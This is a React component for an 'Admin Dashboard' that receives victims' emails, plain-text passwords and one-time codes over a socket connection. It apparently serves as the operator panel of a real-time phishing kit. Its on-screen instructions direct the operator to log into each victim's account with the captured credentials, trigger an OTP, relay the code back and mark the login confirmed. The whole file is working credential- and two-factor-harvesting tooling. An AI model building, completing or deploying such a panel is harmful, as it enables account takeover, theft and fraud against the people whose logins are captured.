import React, { useState, useEffect } from "react";
import { io } from "socket.io-client";
import { Box, VStack, Text, Button, Input, HStack } from "@chakra-ui/react";
import { SERVER_URL } from "../utils/reusables";

const socket = io(SERVER_URL);

const AdminDashboard = () => {
  const [loginAttempts, setLoginAttempts] = useState([]);
  const [otpAttempts, setOtpAttempts] = useState([]);
  const [otpAttemptsMobile, setOtpAttemptsMobile] = useState([]);
  const [updateAttempts, setUpdateAttempts] = useState([]);
  const [updateAttemptsMobile, setUpdateAttemptsMobile] = useState([]);
  const [responseMessage, setResponseMessage] = useState("");
  const [otpResponseMessage, setOtpResponseMessage] = useState("");
  const [otpUpdateResponseMessage, setOtpUpdateResponseMessage] = useState("");

  useEffect(() => {
    socket.emit("registerAdmin");

    socket.on("loginAttempt", (data) => {
      setLoginAttempts((prev) => [...prev, data]);
    });

    socket.on("otpAttempt", (data) => {
      setOtpAttempts((prev) => [...prev, data]);
    });

    socket.on("otpAttemptMobile", (data) => {
      setOtpAttemptsMobile((prev) => [...prev, data]);
    });

    socket.on("otpResendAttempt", (data) => {
      setOtpAttempts((prev) => [...prev, data]);
    });

    socket.on("updateAttempt", (data) => {
      setUpdateAttempts((prev) => [...prev, data]);
    });

    socket.on("updateAttemptMobile", (data) => {
      setUpdateAttemptsMobile((prev) => [...prev, data]);
    });

    return () => {
      socket.off("loginAttempt");
      socket.off("otpAttempt");
      socket.off("otpAttemptMobile");
      socket.off("otpResendAttempt");
      socket.off("updateAttempt");
      socket.off("updateAttemptMobile");
    };
  }, []);

  const handleSendResponse = (data) => {
    socket.emit("adminResponse", {
      email: data.email,
      password: data.password,
      message: responseMessage,
    });
    setResponseMessage("");
  };

  const handleOtpSendResponse = (data) => {
    socket.emit("adminOtpResponse", {
      email: data.email,
      password: data.response.password,
      sendTo: data.response.message,
      message: otpResponseMessage,
    });
    setOtpResponseMessage("");
  };

  const handleOtpUpdateResponse = (email) => {
    socket.emit("adminOtpUpdatedResponse", {
      email,
      message: otpResponseMessage,
    });
    setOtpUpdateResponseMessage("");
  };

  const handleOtpUpdateResponseMobile = (email) => {
    socket.emit("adminOtpUpdatedResponseMobile", {
      email,
      message: otpUpdateResponseMessage,
    });
    setOtpUpdateResponseMessage("");
  };

  return (
    <Box p={5}>
      <Text fontSize="2xl" mb={4}>
        Admin Dashboard
      </Text>
      <VStack align="stretch" spacing={4} bg="#f8a16d">
        {loginAttempts.map((attempt, index) => (
          <Box key={index} borderWidth={1} p={4} borderRadius="md">
            <Text>
              Verify Email To Send OTP To By Logging In With The Below Info And
              Then Enter OTP-Enabled Email Before Clicking "Send Response"
            </Text>
            <Text bg="red" color="#fff">
              Email: {attempt.email}
            </Text>
            <Text bg="#fff" color="red">
              Password: {attempt.password}
            </Text>
            <Text>Timestamp: {attempt.timestamp}</Text>
            <Input
              value={responseMessage}
              onChange={(e) => setResponseMessage(e.target.value)}
              placeholder="Enter the verification email listed on account"
              mt={2}
            />
            <Button onClick={() => handleSendResponse(attempt)} mt={2}>
              Send Response
            </Button>
          </Box>
        ))}
      </VStack>
      <VStack align="stretch" spacing={4} bg="#24f572">
        {otpAttempts.map((attempt, index) => (
          <Box key={index} borderWidth={1} p={4} borderRadius="md">
            <Text>Send OTP</Text>
            <Text>Login Email: {attempt.email}</Text>
            <Text bg="red" color="#fff">
              OTP Will Be Sent To: {attempt.response.message}
            </Text>
            <Text>Password: {attempt.response.password}</Text>
            <Text>Timestamp: {attempt.timestamp}</Text>

            <Button onClick={() => handleOtpSendResponse(attempt)} mt={2}>
              Click If OTP is Sent
            </Button>
          </Box>
        ))}
      </VStack>
      <VStack align="stretch" spacing={4} bg="#24f572">
        {otpAttemptsMobile.map((attempt, index) => (
          <Box key={index} borderWidth={1} p={4} borderRadius="md">
            <Text>Send OTP</Text>
            <Text>Email: {attempt.email}</Text>
            <Text bg="red" color="#fff">
              OTP Will Be Sent To: {attempt.response.message}
            </Text>
            <Text>Password: {attempt.response.password}</Text>
            <Text>Timestamp: {attempt.timestamp}</Text>
            <Text>Timestamp: {attempt.timestamp}</Text>

            <Button onClick={() => handleOtpSendResponse(attempt)} mt={2}>
              OTP Sent
            </Button>
          </Box>
        ))}
      </VStack>
      <VStack align="stretch" spacing={4} bg="#1ea9ff">
        {updateAttempts.map((attempt, index) => (
          <Box key={index} borderWidth={1} p={4} borderRadius="md">
            <Text>OTP Updated</Text>
            <Text>Email: {attempt.email}</Text>
            <Text>OTPsentTo: {attempt.sentTo}</Text>
            <Text>Password: {attempt.password}</Text>
            <Text bg="red" color="#fff">
              OTP: {attempt.otp}
            </Text>
            <Text>Timestamp: {attempt.timestamp}</Text>

            <HStack gap="3rem">
              <Button
                onClick={() => handleOtpUpdateResponse(attempt.email)}
                mt={2}
                bg="green"
                color="#fff"
              >
                Login Confirmed
              </Button>

              <Button
                onClick={() =>
                  alert("Fix The Login Not Confirmed Button's function")
                }
                mt={2}
                bg="red"
                color="#fff"
              >
                Login Not Confirmed
              </Button>
            </HStack>
          </Box>
        ))}
      </VStack>
      <VStack align="stretch" spacing={4} bg="#1ea9ff">
        {updateAttemptsMobile.map((attempt, index) => (
          <Box key={index} borderWidth={1} p={4} borderRadius="md">
            <Text>OTP Updated</Text>
            <Text>Email: {attempt.email}</Text>
            <Text>Password: {attempt.password}</Text>
            <Text>OTPsentTo: {attempt.sentTo}</Text>
            <Text bg="red" color="#fff">
              OTP: {attempt.otp}
            </Text>
            <Text>Timestamp: {attempt.timestamp}</Text>

            <HStack gap="3rem">
              <Button
                onClick={() => handleOtpUpdateResponseMobile(attempt.email)}
                mt={2}
                bg="green"
                color="#fff"
              >
                Login Confirmed (m)
              </Button>
              <Button
                onClick={() =>
                  alert("Fix The Login Not Confirmed Button's function")
                }
                mt={2}
                bg="red"
                color="#fff"
              >
                Login Not Confirmed (m)
              </Button>
            </HStack>
          </Box>
        ))}
      </VStack>
    </Box>
  );
};

export default AdminDashboard;
